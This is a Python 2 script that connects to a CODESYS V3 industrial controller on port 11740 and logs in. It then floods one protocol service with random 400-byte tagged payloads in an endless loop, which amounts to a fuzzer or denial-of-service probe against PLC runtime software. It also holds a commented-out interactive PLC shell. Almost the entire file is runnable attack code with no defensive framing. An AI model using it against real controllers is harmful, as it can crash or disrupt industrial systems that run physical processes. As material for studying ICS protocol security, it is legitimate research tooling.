#! /usr/bin/env python2
import sys
import os
import time



sys.path.append("..")
from lib.layers import s_tag, layer7
from lib import pycodesys
import time

'''

'''

cds = pycodesys.CodesysNode(host=sys.argv[1], port=11740, verbose=True)
chan_id = cds.connect()
if not chan_id:
    exit(0)

cds.loginToDevice()

#cds.loginToApp()
#addr1 = 0xffffffff
addr1 = 0xb6281d0
addr2 = addr1

cnt = 0

try:
    while True:
        cnt +=1
        rand = os.urandom(400)
        print("counter: "+str(cnt))

        tagdata = s_tag(0x81, s_tag(0x10, rand))


        cds.send_layer7(layer7(service_group=0x02, command_id=0x03, sess_id=cds.sess_id, data=tagdata))
        # Response
        res = cds.recv_layer7()

except KeyboardInterrupt:
    print('Interrupted')
    cds.disconnect()
    exit(0)




# hostname = cds.host + ' plc'
#
# try:
#     while True:
#         print('--Codesys3 shell--')
#         incmd = str(raw_input(hostname + ' > '))
#         # cds.plcshell(incmd)
#         exit(1)
#
# except KeyboardInterrupt:
#     print('Interrupted')
#     cds.disconnect()
#     exit(0)
#

